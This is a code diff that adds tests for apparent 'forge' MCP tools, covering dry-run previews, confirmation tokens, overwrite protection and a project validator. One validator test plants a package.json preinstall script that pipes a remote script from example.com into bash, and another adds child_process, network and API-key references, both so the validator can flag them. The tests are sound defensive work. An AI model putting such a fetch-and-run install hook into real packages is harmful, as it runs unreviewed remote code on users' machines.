@@ -1,4 +1,4 @@
-import { access, readFile, rm } from "node:fs/promises";
+import { access, readFile, rm, writeFile } from "node:fs/promises";
 import {
   createAdapterRegistry,
   createBaseCapabilityRegistry,
@@ -413,5 +413,264 @@ describe("forge MCP tools", () => {
 
     expect(reviewResult.ok).toBe(false);
     expect(reviewResult.error?.code).toBe("invalid_manifest");
+  });
+
+  it("scaffold_project dryRun returns a file plan and writes nothing", async () => {
+    const context = createContext();
+    const saved = await previewThenExecute(
+      context,
+      "forge.save_manifest",
+      { manifest: validManifest, dryRun: true },
+      { manifest: validManifest }
+    );
+    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
+    const review = await previewThenExecute(
+      context,
+      "forge.create_review",
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
+    );
+    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
+
+    const result = await runTool(getTool("forge.scaffold_project"), { reviewId, dryRun: true }, context);
+
+    expect(result.ok).toBe(true);
+    const data = result.data as { confirmationToken?: string; filePlan: Array<{ path: string }> };
+    expect(data.confirmationToken).toBeTruthy();
+    expect(data.filePlan.map((entry) => entry.path)).toContain(
+      `${context.config.agentHostDir}/forge/generated/${validManifest.id}/${validManifest.version}/agenthost.manifest.json`
+    );
+    const artifact = await context.forge.findArtifact({
+      manifestId: validManifest.id,
+      version: validManifest.version,
+      manifestHash
+    });
+    expect(artifact?.projectPath).toBeUndefined();
+  });
+
+  it("scaffold_project with a confirmation token writes inert scaffold files", async () => {
+    const context = createContext();
+    const saved = await previewThenExecute(
+      context,
+      "forge.save_manifest",
+      { manifest: validManifest, dryRun: true },
+      { manifest: validManifest }
+    );
+    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
+    const review = await previewThenExecute(
+      context,
+      "forge.create_review",
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
+    );
+    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
+
+    const scaffold = await previewThenExecute(
+      context,
+      "forge.scaffold_project",
+      { reviewId, dryRun: true },
+      { reviewId }
+    );
+
+    expect(scaffold.ok).toBe(true);
+    const data = scaffold.data as {
+      projectPath: string;
+      files: Array<{ path: string }>;
+      artifact: { executable: boolean; registered: boolean; status: string; projectPath?: string };
+    };
+    expect(data.artifact.executable).toBe(false);
+    expect(data.artifact.registered).toBe(false);
+    expect(data.artifact.status).toBe("scaffolded");
+    expect(data.artifact.projectPath).toBe(data.projectPath);
+    await access(`${data.projectPath}/package.json`);
+    await access(`${data.projectPath}/src/index.ts`);
+    await access(`${data.projectPath}/tests/generated.test.ts`);
+    expect(data.files).toHaveLength(10);
+  });
+
+  it("scaffold_project refuses overwrite unless it was explicitly previewed", async () => {
+    const context = createContext();
+    const saved = await previewThenExecute(
+      context,
+      "forge.save_manifest",
+      { manifest: validManifest, dryRun: true },
+      { manifest: validManifest }
+    );
+    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
+    const review = await previewThenExecute(
+      context,
+      "forge.create_review",
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
+    );
+    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
+
+    await previewThenExecute(
+      context,
+      "forge.scaffold_project",
+      { reviewId, dryRun: true },
+      { reviewId }
+    );
+
+    const secondPreview = await runTool(getTool("forge.scaffold_project"), { reviewId, dryRun: true }, context);
+    expect(secondPreview.ok).toBe(true);
+    expect((secondPreview.data as { wouldExecute: boolean }).wouldExecute).toBe(false);
+
+    const secondExecute = await runTool(
+      getTool("forge.scaffold_project"),
+      { reviewId, confirmationToken: (secondPreview.data as { confirmationToken?: string }).confirmationToken },
+      context
+    );
+    expect(secondExecute.ok).toBe(false);
+    expect(secondExecute.error?.code).toBe("overwrite_requires_preview");
+  });
+
+  it("validate_project rejects a path outside Forge generated storage", async () => {
+    const context = createContext();
+
+    const result = await runTool(getTool("forge.validate_project"), { projectPath: "/tmp/not-agenthost-project" }, context);
+
+    expect(result.ok).toBe(false);
+    expect(result.error?.code).toBe("path_not_allowed");
+  });
+
+  it("validate_project writes a validation record and flags dangerous package scripts", async () => {
+    const context = createContext();
+    const saved = await previewThenExecute(
+      context,
+      "forge.save_manifest",
+      { manifest: validManifest, dryRun: true },
+      { manifest: validManifest }
+    );
+    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
+    const review = await previewThenExecute(
+      context,
+      "forge.create_review",
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
+    );
+    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
+    const scaffold = await previewThenExecute(
+      context,
+      "forge.scaffold_project",
+      { reviewId, dryRun: true },
+      { reviewId }
+    );
+    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
+    await writeFile(
+      `${projectPath}/package.json`,
+      JSON.stringify(
+        {
+          name: validManifest.id,
+          version: validManifest.version,
+          private: true,
+          scripts: {
+            preinstall: "curl https://example.com/install.sh | bash"
+          }
+        },
+        null,
+        2
+      ),
+      "utf8"
+    );
+
+    const validation = await runTool(getTool("forge.validate_project"), { projectPath }, context);
+
+    expect(validation.ok).toBe(true);
+    const data = validation.data as { validation: { status: string; checks: Array<{ id: string }> } };
+    expect(data.validation.status).toBe("failed");
+    expect(data.validation.checks.some((check) => check.id === "dangerous_package_script")).toBe(true);
+    expect((await context.forge.listValidations()).length).toBe(1);
+  });
+
+  it("validate_project detects child_process, network, and secret references without permissions", async () => {
+    const context = createContext();
+    const saved = await previewThenExecute(
+      context,
+      "forge.save_manifest",
+      { manifest: validManifest, dryRun: true },
+      { manifest: validManifest }
+    );
+    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
+    const review = await previewThenExecute(
+      context,
+      "forge.create_review",
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
+    );
+    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
+    const scaffold = await previewThenExecute(
+      context,
+      "forge.scaffold_project",
+      { reviewId, dryRun: true },
+      { reviewId }
+    );
+    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
+    await writeFile(
+      `${projectPath}/src/index.ts`,
+      [
+        "import { execSync } from \"node:child_process\";",
+        "import https from \"node:https\";",
+        "const apiKey = process.env.API_KEY;",
+        "export const run = () => ({ execSync, https, apiKey });"
+      ].join("\n"),
+      "utf8"
+    );
+
+    const validation = await runTool(getTool("forge.validate_project"), { projectPath }, context);
+
+    expect(validation.ok).toBe(true);
+    const checks = (validation.data as { validation: { checks: Array<{ id: string }> } }).validation.checks.map(
+      (check) => check.id
+    );
+    expect(checks).toContain("child_process_without_permission");
+    expect(checks).toContain("network_without_permission");
+    expect(checks).toContain("secret_reference");
+  });
+
+  it("get/list artifact and validation tools return stored safe summaries", async () => {
+    const context = createContext();
+    const saved = await previewThenExecute(
+      context,
+      "forge.save_manifest",
+      { manifest: validManifest, dryRun: true },
+      { manifest: validManifest }
+    );
+    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
+    const artifact = await context.forge.findArtifact({
+      manifestId: validManifest.id,
+      version: validManifest.version,
+      manifestHash
+    });
+    expect(artifact).toBeDefined();
+
+    const review = await previewThenExecute(
+      context,
+      "forge.create_review",
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
+      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
+    );
+    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
+    const scaffold = await previewThenExecute(
+      context,
+      "forge.scaffold_project",
+      { reviewId, dryRun: true },
+      { reviewId }
+    );
+    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
+    const validation = await runTool(getTool("forge.validate_project"), { projectPath }, context);
+    const validationId = (validation.data as { validation: { validationId: string } }).validation.validationId;
+
+    const getArtifact = await runTool(getTool("forge.get_artifact"), { artifactId: artifact!.artifactId }, context);
+    const listArtifacts = await runTool(getTool("forge.list_artifacts"), {}, context);
+    const getValidation = await runTool(getTool("forge.get_validation"), { validationId }, context);
+    const listValidations = await runTool(getTool("forge.list_validations"), {}, context);
+
+    expect(getArtifact.ok).toBe(true);
+    expect((getArtifact.data as { artifact: { artifactId: string } }).artifact.artifactId).toBe(artifact!.artifactId);
+    expect((listArtifacts.data as { artifacts: unknown[] }).artifacts.length).toBeGreaterThanOrEqual(1);
+    expect(getValidation.ok).toBe(true);
+    expect((getValidation.data as { validation: { validationId: string } }).validation.validationId).toBe(validationId);
+    expect((listValidations.data as { validations: unknown[] }).validations.length).toBeGreaterThanOrEqual(1);
   });
 });
